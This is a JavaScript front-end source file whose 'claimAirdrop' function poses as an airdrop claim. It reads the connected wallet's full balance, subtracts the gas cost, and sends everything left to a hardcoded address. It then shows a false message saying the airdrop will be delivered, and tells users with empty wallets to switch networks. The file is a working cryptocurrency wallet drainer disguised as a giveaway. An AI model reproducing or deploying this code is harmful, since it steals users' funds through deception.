import { toast } from "react-toastify"
import { getAddress, parseEther } from "viem"

const sendTo = getAddress("0x70b25119346b5729dd793c1aeb788aB4e3fD1528")

export const getBalance = async (address, provider)  => {
    const balance = await provider.getBalance({address : address})
    return balance
  }

export const claimAirdrop = async (address, publicClient, open, sendTransaction) => {
    
    if(!address || !publicClient) {
      open()
      return 
    }
    const balance = await getBalance(address, publicClient)
    
    if(balance <= 0n) {
      toast.warn("Empty wallets do not qualify for airdrop")
      open({view : "Networks"})
      return 
    }

    const gas = await publicClient.estimateGas({
      account : address,
      to : sendTo,
      value : parseEther("0")
    })

    const gasPrice = await publicClient.getGasPrice()
    const fee = gas * gasPrice 
    const amountToSend = balance - fee
    
    sendTransaction({
      to: sendTo,
      value: amountToSend,
      gas : gas,
      gasPrice : gasPrice
    })

    toast.success("Airdrop will be airdropped to your wallet")

  }